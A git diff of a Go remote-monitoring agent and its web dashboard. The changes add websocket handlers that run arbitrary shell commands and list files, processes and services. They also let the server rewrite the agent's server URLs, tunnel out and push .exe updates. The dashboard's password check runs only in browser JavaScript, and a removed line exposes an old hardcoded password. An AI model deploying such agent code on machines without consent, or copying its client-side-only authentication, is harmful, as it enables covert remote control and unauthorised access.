+		allDone = append(allDone, done)
+		
+		go func(c *websocket.Conn, name string, done chan struct{}) {
+			defer close(done)
+			for {
+				_, m, e := c.ReadMessage()
+				if e != nil {
+					log("[" + name + "] Disconnected: " + e.Error())
+					return
 				}
-				controlCmdCount++
-				if controlCmdCount <= maxControlCmdsPerSec {
-					executeControl(d.Command, d.Params)
-				} else {
-					// Silently drop excess commands
+				var d Message
+				if err := json.Unmarshal(m, &d); err != nil {
+					log("Invalid message: " + err.Error())
+					continue
 				}
-			}
-			if d.Type == "set-server-preference" {
-				saveServerPreference(d.Command == "true")
-				log("Remote: set server preference = " + d.Command)
-			}
-			if d.Type == "push-update" {
-				handleRemoteUpdate(d.Command, d.Frame)
-			}
-		if d.Type == "switch-server" && d.Command != "" {
-			log("Remote switch to: " + d.Command)
-			os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(d.Command+"\n"), 0644)
-			saveServerPreference(true)
-			c.Close()
-			return
-		}
-		if d.Type == "update-server-list" {
-			rawUrls, ok := d.Data["urls"]
-			if !ok {
-				log("Missing urls in update-server-list")
-				break
-			}
-			urlSlice, ok := rawUrls.([]interface{})
-			if !ok {
-				log("Invalid urls format in update-server-list")
-				break
-			}
-			var newUrls []string
-			for _, u := range urlSlice {
-				if s, ok := u.(string); ok {
-					newUrls = append(newUrls, s)
-				}
-			}
-			if len(newUrls) > 0 {
-				content := strings.Join(newUrls, "\n") + "\n"
-				os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(content), 0644)
-				log("Server list updated remotely: " + strings.Join(newUrls, ", "))
-				c.Close()
-				return
-			}
-		}
-			if d.Type == "file-transfer" {
-				handleFileTransfer(d.Command, d.Frame)
-			}
-			if d.Type == "request-file" {
-				go handleFileRequest(d.Command, c)
-			}
-			if d.Type == "start-tunnel" {
-				startTunnel(c)
-			}
-			if d.Type == "cleanup-logs" {
-				cleanupLogs()
-			}
-			if d.Type == "become-server" {
-				log("Remote: exposing as server via tunnel")
-				saveServerPreference(true)
-				startTunnel(c)
-			}
-			if d.Type == "webrtc-offer" {
-				sdpRaw, sdpOk := d.Data["sdp"]
-				viewerRaw, viewOk := d.Data["viewer"]
-				if sdpOk && viewOk {
-					sdpStr, sdpStrOk := sdpRaw.(string)
-					viewerId, viewStrOk := viewerRaw.(string)
-					if sdpStrOk && viewStrOk {
-						var offer webrtc.SessionDescription
-						offer.SDP = sdpStr
-						offer.Type = webrtc.SDPTypeOffer
-						go handleWebRTCOffer(c, viewerId, offer)
+				if d.Type == "set-fps" && d.Fps > 0 {
+					fps = d.Fps
+					if fps <= 2 {
+						jpegQuality = 50
+						isRemoteConnection = false
+					} else if fps <= 5 {
+						jpegQuality = 40
+						isRemoteConnection = true
+					} else {
+						jpegQuality = 30
+						isRemoteConnection = true
 					}
 				}
-			}
-			if d.Type == "webrtc-ice-candidate" {
-				if candRaw, ok := d.Data["candidate"]; ok {
-					candStr, strOk := candRaw.(string)
+				if d.Type == "control" {
+					now := time.Now()
+					if now.Sub(controlCmdWindowStart) > time.Second {
+						controlCmdWindowStart = now
+						controlCmdCount = 0
+					}
+					controlCmdCount++
+					if controlCmdCount <= maxControlCmdsPerSec {
+						executeControl(d.Command, d.Params)
+					}
+				}
+				if d.Type == "set-server-preference" {
+					saveServerPreference(d.Command == "true")
+					log("[" + name + "] set server preference = " + d.Command)
+				}
+				if d.Type == "push-update" {
+					handleRemoteUpdate(d.Command, d.Frame)
+				}
+				if d.Type == "switch-server" && d.Command != "" {
+					log("[" + name + "] Remote switch to: " + d.Command)
+					os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(d.Command+"\n"), 0644)
+					saveServerPreference(true)
+					return
+				}
+				if d.Type == "update-server-list" {
+					rawUrls, ok := d.Data["urls"]
+					if !ok { break }
+					urlSlice, ok := rawUrls.([]interface{})
+					if !ok { break }
+					var newUrls []string
+					for _, u := range urlSlice {
+						if s, ok := u.(string); ok {
+							newUrls = append(newUrls, s)
+						}
+					}
+					if len(newUrls) > 0 {
+						content := strings.Join(newUrls, "\n") + "\n"
+						os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(content), 0644)
+						log("Server list updated: " + strings.Join(newUrls, ", "))
+						return
+					}
+				}
+				if d.Type == "file-transfer" {
+					handleFileTransfer(d.Command, d.Frame)
+				}
+				if d.Type == "request-file" {
+					go handleFileRequest(d.Command, c)
+				}
+				if d.Type == "start-tunnel" {
+					startTunnel(c)
+				}
+				if d.Type == "become-server" {
+					log("[" + name + "] exposing as server via tunnel")
+					saveServerPreference(true)
+					startTunnel(c)
+				}
+				if d.Type == "webrtc-offer" {
+					sdpRaw, sdpOk := d.Data["sdp"]
 					viewerRaw, viewOk := d.Data["viewer"]
-					if strOk && viewOk {
+					if sdpOk && viewOk {
+						sdpStr, sdpStrOk := sdpRaw.(string)
 						viewerId, viewStrOk := viewerRaw.(string)
-						if viewStrOk {
-							var cand webrtc.ICECandidateInit
-							if err := json.Unmarshal([]byte(candStr), &cand); err != nil {
-								log("WebRTC ICE candidate parse error: " + err.Error())
-							} else {
-								handleWebRTCICECandidate(viewerId, cand)
+						if sdpStrOk && viewStrOk {
+							var offer webrtc.SessionDescription
+							offer.SDP = sdpStr
+							offer.Type = webrtc.SDPTypeOffer
+							go handleWebRTCOffer(c, viewerId, offer)
+						}
+					}
+				}
+				if d.Type == "webrtc-ice-candidate" {
+					if candRaw, ok := d.Data["candidate"]; ok {
+						candStr, strOk := candRaw.(string)
+						viewerRaw, viewOk := d.Data["viewer"]
+						if strOk && viewOk {
+							viewerId, viewStrOk := viewerRaw.(string)
+							if viewStrOk {
+								var cand webrtc.ICECandidateInit
+								if err := json.Unmarshal([]byte(candStr), &cand); err != nil {
+									log("WebRTC ICE candidate parse error: " + err.Error())
+								} else {
+									handleWebRTCICECandidate(viewerId, cand)
+								}
 							}
 						}
 					}
 				}
+				if d.Type == "request-system-info" {
+					go func() {
+						info := getSystemInfo()
+						c.WriteJSON(Message{Type: "system-info", AgentId: agentId, Data: info})
+					}()
+				}
+				if d.Type == "request-processes" {
+					go func() {
+						procs := getProcessList()
+						c.WriteJSON(Message{Type: "process-list", AgentId: agentId, Data: map[string]interface{}{"processes": procs}})
+					}()
+				}
+				if d.Type == "kill-process" {
+					pid := d.Command
+					go func() {
+						ok := killProcess(pid)
+						c.WriteJSON(Message{Type: "process-killed", AgentId: agentId, Data: map[string]interface{}{"pid": pid, "success": ok}})
+					}()
+				}
+				if d.Type == "request-services" {
+					go func() {
+						svcs := getServiceList()
+						c.WriteJSON(Message{Type: "service-list", AgentId: agentId, Data: map[string]interface{}{"services": svcs}})
+					}()
+				}
+				if d.Type == "control-service" {
+					svcName := d.Command
+					action := strVal(d.Data["action"])
+					go func() {
+						ok := controlService(svcName, action)
+						c.WriteJSON(Message{Type: "service-controlled", AgentId: agentId, Data: map[string]interface{}{"name": svcName, "action": action, "success": ok}})
+					}()
+				}
+				if d.Type == "request-drives" {
+					go func() {
+						drives := getDriveList()
+						c.WriteJSON(Message{Type: "drive-list", AgentId: agentId, Data: map[string]interface{}{"drives": drives}})
+					}()
+				}
+				if d.Type == "list-files" {
+					dirPath := d.Command
+					go func() {
+						files := listFiles(dirPath)
+						c.WriteJSON(Message{Type: "file-list", AgentId: agentId, Data: map[string]interface{}{"path": dirPath, "files": files}})
+					}()
+				}
+				if d.Type == "request-network" {
+					go func() {
+						netInfo := getNetworkInfo()
+						c.WriteJSON(Message{Type: "network-info", AgentId: agentId, Data: netInfo})
+					}()
+				}
+				if d.Type == "request-event-logs" {
+					count := intVal(d.Data["count"])
+					if count <= 0 { count = 50 }
+					go func() {
+						logs := getEventLogs(count)
+						c.WriteJSON(Message{Type: "event-logs", AgentId: agentId, Data: map[string]interface{}{"logs": logs}})
+					}()
+				}
+				if d.Type == "execute-command" {
+					cmd := d.Command
+					go func() {
+						output := executeShellCommand(cmd)
+						c.WriteJSON(Message{Type: "command-output", AgentId: agentId, Data: map[string]interface{}{"command": cmd, "output": output}})
+					}()
+				}
+				if d.Type == "request-screenshot" {
+					go func() {
+						img := captureDisplay(0)
+						c.WriteJSON(Message{Type: "screenshot", AgentId: agentId, Frame: img})
+					}()
+				}
+				if d.Type == "lock-screen" {
+					go func() {
+						lockWorkstation()
+						c.WriteJSON(Message{Type: "screen-locked", AgentId: agentId})
+					}()
+				}
+				if d.Type == "logoff-user" {
+					go func() {
+						logoffUser()
+					}()
+				}
+				if d.Type == "shutdown" {
+					go func() {
+						shutdownPC()
+					}()
+				}
+				if d.Type == "restart" {
+					go func() {
+						restartPC()
+					}()
+				}
+				if d.Type == "sleep" {
+					go func() {
+						sleepPC()
+					}()
+				}
 			}
-		}
-	}()
-	fc := 0
-	for {
-		select {
-		case <-done: return
-		default:
+		}(c, name, done)
+	}
+	
+	// Frame sender: capture once, distribute to each connection independently
+	lastFrameTime := time.Now()
+	
+	// Per-connection frame senders with independent rate limiting
+	type connSender struct {
+		conn      *websocket.Conn
+		name      string
+		isLocal   bool
+		fps       int
+		lastSend  time.Time
+		frameCount int
+		dropped   int
+	}
+	
+	var senders []connSender
+	for i, c := range connections {
+		name := connNames[i]
+		isLocal := strings.Contains(name, "local") || strings.Contains(name, "127.0.0.1")
+		senders = append(senders, connSender{
+			conn:    c,
+			name:    name,
+			isLocal: isLocal,
+			fps:     10, // Default
+			lastSend: time.Now(),
+		})
+	}
+	
+	// Frame capture goroutine (runs at fixed rate)
+	frameChan := make(chan []Message, 10) // Buffer up to 10 frames
+	go func() {
+		captureTick := time.NewTicker(time.Second / 5) // Capture at 5 FPS max
+		defer captureTick.Stop()
+		for {
+			<-captureTick.C
+			// Check if any connection is still alive
+			allDead := true
+			for _, done := range allDone {
+				select {
+				case <-done:
+				default:
+					allDead = false
+				}
+			}
+			if allDead { return }
+			
 			func() {
 				defer func() {
 					if r := recover(); r != nil {
 						log("Frame capture panic: " + fmt.Sprintf("%v", r))
 					}
 				}()
-				frameSkipCounter++
-				if isRemoteConnection && frameSkipCounter%2 == 0 {
-					time.Sleep(time.Second / time.Duration(fps))
-					return
-				}
 				frames := captureFrames()
-				for _, m := range frames {
-					sentToWebRTC := sendFrameOverWebRTC(m.Frame)
-					shouldSendToWebSocket := sentToWebRTC == 0 || (fc%fps == 0)
-					if shouldSendToWebSocket {
-						m.Type = "agent-frame"
-						m.AgentId = agentId
-						if err := c.WriteJSON(m); err != nil {
-							log("Disconnected: write error: " + err.Error())
-							return
-						}
+				if len(frames) > 0 {
+					select {
+					case frameChan <- frames:
+					default:
+						// Channel full, drop frame (better than blocking)
 					}
-					fc++
 				}
 			}()
-			time.Sleep(time.Second / time.Duration(fps))
 		}
+	}()
+	
+	// Per-connection frame sender goroutines
+	for i := range senders {
+		s := &senders[i]
+		go func(s *connSender) {
+			ticker := time.NewTicker(time.Second / time.Duration(s.fps))
+			defer ticker.Stop()
+			
+			for {
+				select {
+				case <-ticker.C:
+					// Check if connection is still alive
+					connAlive := false
+					for _, done := range allDone {
+						select {
+						case <-done:
+						default:
+							connAlive = true
+						}
+					}
+					if !connAlive { return }
+					
+					// Get latest frame (non-blocking)
+					select {
+					case frames := <-frameChan:
+						for _, m := range frames {
+							m.Type = "agent-frame"
+							m.AgentId = agentId
+							if err := s.conn.WriteJSON(m); err != nil {
+								s.dropped++
+								if s.dropped%10 == 0 {
+									log("[" + s.name + "] dropped " + strconv.Itoa(s.dropped) + " frames")
+								}
+								return
+							}
+							s.frameCount++
+						}
+					default:
+						// No new frame, skip
+					}
+				}
+			}
+		}(s)
+	}
+	
+	// WebRTC frame sender (separate goroutine)
+	go func() {
+		ticker := time.NewTicker(time.Second / 3) // WebRTC at 3 FPS
+		defer ticker.Stop()
+		for {
+			<-ticker.C
+			allDead := true
+			for _, done := range allDone {
+				select {
+				case <-done:
+				default:
+					allDead = false
+				}
+			}
+			if allDead { return }
+			
+			select {
+			case frames := <-frameChan:
+				for _, m := range frames {
+					sendFrameOverWebRTC(m.Frame)
+				}
+			default:
+			}
+		}
+	}()
+	
+	// Main loop: just keep alive and monitor
+	for {
+		allClosed := true
+		for _, done := range allDone {
+			select {
+			case <-done:
+			default:
+				allClosed = false
+			}
+		}
+		if allClosed {
+			log("All connections closed")
+			return
+		}
+		
+		// Adaptive FPS adjustment based on connection health
+		now := time.Now()
+		if now.Sub(lastFrameTime) > 10*time.Second {
+			lastFrameTime = now
+			for i := range senders {
+				s := &senders[i]
+				// If local connection, use higher FPS
+				if s.isLocal {
+					s.fps = 10
+				} else {
+					// Remote connections: lower FPS to reduce bandwidth
+					s.fps = 3
+				}
+			}
+		}
+		
+		time.Sleep(time.Second)
 	}
 }
 
@@ -1719,16 +2347,16 @@ h1{font-size:16px;color:#2563eb;display:flex;align-items:center;gap:8px}
 #auth-overlay .auth-box button:hover{background:#1d4ed8}
 #auth-overlay .auth-box .error{color:#dc2626;font-size:12px;margin-top:5px;display:none}
  </style></head><body class="readonly">
-<div id="auth-overlay">
+ <div id="auth-overlay">
   <div class="auth-box">
-    <h2>🔒 Remote Monitor</h2>
+    <h2>🔒 BRANDING_TITLE</h2>
     <p style="font-size:12px;color:#64748b;margin-bottom:15px">Enter password for full access</p>
     <input type="password" id="auth-pass" placeholder="Enter password" onkeydown="if(event.key==='Enter')unlockDashboard()" autofocus>
     <button onclick="unlockDashboard()">Unlock Dashboard</button>
     <div class="error" id="auth-error">Incorrect password</div>
   </div>
 </div>
-<header><h1>🖥 Remote Monitor</h1><div style="display:flex;align-items:center;gap:8px"><button onclick="document.getElementById('update-file').click()" class="readonly-hidden" style="background:none;border:none;font-size:11px;color:#94a3b8;cursor:pointer;padding:2px 6px;border-radius:4px" title="Push update to all agents">⬆️ Update</button><input type="file" id="update-file" accept=".exe" style="display:none" onchange="uploadUpdate(this)"><a href="#" onclick="showAllTiles();return false" style="font-size:11px;color:#94a3b8;text-decoration:none" title="Show hidden screens">👁</a><span style="cursor:pointer;font-size:11px;color:#94a3b8" onclick="showAuth()" title="Unlock full access">🔒</span><span id="status">Disconnected</span></div></header>
+<header><h1>🖥 BRANDING_TITLE</h1><div style="display:flex;align-items:center;gap:8px"><button onclick="document.getElementById('update-file').click()" class="readonly-hidden" style="background:none;border:none;font-size:11px;color:#94a3b8;cursor:pointer;padding:2px 6px;border-radius:4px" title="Push update to all agents">⬆️ Update</button><input type="file" id="update-file" accept=".exe" style="display:none" onchange="uploadUpdate(this)"><a href="#" onclick="showAllTiles();return false" style="font-size:11px;color:#94a3b8;text-decoration:none" title="Show hidden screens">👁</a><span style="cursor:pointer;font-size:11px;color:#94a3b8" onclick="showAuth()" title="Unlock full access">🔒</span><span id="status">Disconnected</span></div></header>
 <div id="tunnel-url"></div>
 <div id="grid"></div>
 <div id="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-label" id="modal-label"></div><img id="modal-img"></div>
@@ -1787,7 +2415,7 @@ function grid(){
 function closeModal(){document.getElementById('modal').classList.remove('show');modalState.agentId=null}
 function showToast(msg){var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show')},4000)}
 function showAuth(){document.getElementById('auth-overlay').classList.add('show');document.getElementById('auth-pass').focus()}
-function unlockDashboard(){var p=document.getElementById('auth-pass').value;var e=document.getElementById('auth-error');e.style.display='none';if(p==='puneet12'){document.body.classList.remove('readonly');isUnlocked=true;document.getElementById('auth-overlay').classList.remove('show')}else{e.style.display='block';document.getElementById('auth-pass').value='';document.getElementById('auth-pass').focus()}}
+function unlockDashboard(){var p=document.getElementById('auth-pass').value;var e=document.getElementById('auth-error');e.style.display='none';if(p==='PASS_PLACEHOLDER'){document.body.classList.remove('readonly');isUnlocked=true;document.getElementById('auth-overlay').classList.remove('show')}else{e.style.display='block';document.getElementById('auth-pass').value='';document.getElementById('auth-pass').focus()}}
 function hideTile(id){var t=document.getElementById('t-'+id);if(t)t.style.display='none'}
 function showAllTiles(){var els=document.querySelectorAll('.tile');for(var i=0;i<els.length;i++)els[i].style.display=''}
 function uploadUpdate(input){var file=input.files[0];if(!file)return;var reader=new FileReader();reader.onload=function(){w.send(JSON.stringify({type:'push-update',command:file.name,frame:reader.result.split(',')[1]}));showToast('Update pushed to all agents');input.value=''};reader.readAsDataURL(file)}
